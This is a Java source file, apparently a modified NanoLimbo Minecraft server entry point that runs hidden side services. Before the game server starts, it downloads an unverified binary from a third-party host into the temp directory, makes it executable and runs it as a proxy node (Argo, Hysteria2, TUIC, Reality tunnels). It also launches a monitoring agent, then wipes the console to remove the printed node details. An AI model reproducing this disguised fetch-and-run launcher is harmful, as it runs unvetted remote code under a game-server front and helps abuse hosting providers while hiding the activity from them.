/*
 * Copyright (C) 2020 Nan1t
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.lang.reflect.Field;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    private static Process komariProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "KOMARI_ENDPOINT", "KOMARI_TOKEN",
        "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
    };
    
    
    public static void main(String[] args) {
        
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }

        // Start services (s-box for proxies + Komari for monitoring)
        try {
            runSbxBinary();  // s-box 用于代理功能 (Argo, HY2, TUIC, REALITY等)
            runKomariAgent(); // Komari 用于监控功能 (替换哪吒)

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            // Wait 20 seconds before continuing
            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(15000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
        }
        
        // start game
        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO()
                    .start()
                    .waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                
                new ProcessBuilder("tput", "reset")
                    .inheritIO()
                    .start()
                    .waitFor();
                
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            } catch (Exception ignored) {}
        }
    }

    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);

        // 移除哪吒相关的环境变量，因为我们使用 Komari
        envVars.remove("NEZHA_SERVER");
        envVars.remove("NEZHA_PORT");
        envVars.remove("NEZHA_KEY");

        ProcessBuilder pb = new ProcessBuilder(getSbxBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);

        sbxProcess = pb.start();
        System.out.println(ANSI_GREEN + "s-box (proxy services) started successfully" + ANSI_RESET);
    }

    private static void runKomariAgent() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);

        String komariEndpoint = envVars.get("KOMARI_ENDPOINT");
        String komariToken = envVars.get("KOMARI_TOKEN");

        if (komariEndpoint == null || komariToken == null ||
            komariEndpoint.isEmpty() || komariToken.isEmpty()) {
            System.out.println(ANSI_YELLOW + "KOMARI_ENDPOINT or KOMARI_TOKEN not set, skipping Komari agent" + ANSI_RESET);
            return;
        }

        Path binaryPath = getKomariBinaryPath();

        // 构建 Komari Agent 启动命令
        // Komari 使用 -e 和 -t 参数
        List<String> command = new ArrayList<>();
        command.add(binaryPath.toString());
        command.add("-e");
        command.add(komariEndpoint);
        command.add("-t");
        command.add(komariToken);

        ProcessBuilder pb = new ProcessBuilder(command);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);

        komariProcess = pb.start();

        System.out.println(ANSI_GREEN + "Komari agent (monitoring) started successfully" + ANSI_RESET);
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "609ccef9-8d4e-4b45-ae2a-7a43e8d02e6d");
        envVars.put("FILE_PATH", "./world");
        envVars.put("REVERSE_PROXY_MODE", "grpcwebproxy");

        // Komari 监控配置 (替换哪吒)
        envVars.put("KOMARI_ENDPOINT", "");  // 例如: https://km.bcbc.pp.ua
        envVars.put("KOMARI_TOKEN", "");     // Komari 认证令牌

        // 代理服务配置 (保留)
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "");
        envVars.put("ARGO_AUTH", "");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "cf.877774.xyz");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "Mc");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value); 
                    }
                }
            }
        }
    }

    // 下载 s-box (用于代理服务)
    private static Path getSbxBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/s-box";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }

    // 下载 Komari Agent (用于监控服务)
    private static Path getKomariBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String archName;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            archName = "amd64";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            archName = "arm64";
        } else if (osArch.contains("s390x")) {
            throw new RuntimeException("Komari does not support s390x architecture");
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        // 使用官方 Komari Agent 下载地址
        String osName = "linux";  // 假设运行在 Linux 上
        String url = String.format(
            "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-%s-%s",
            osName, archName
        );

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "komari-agent");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "s-box (proxy services) terminated" + ANSI_RESET);
        }
        if (komariProcess != null && komariProcess.isAlive()) {
            komariProcess.destroy();
            System.out.println(ANSI_RED + "Komari agent (monitoring) terminated" + ANSI_RESET);
        }
    }
}
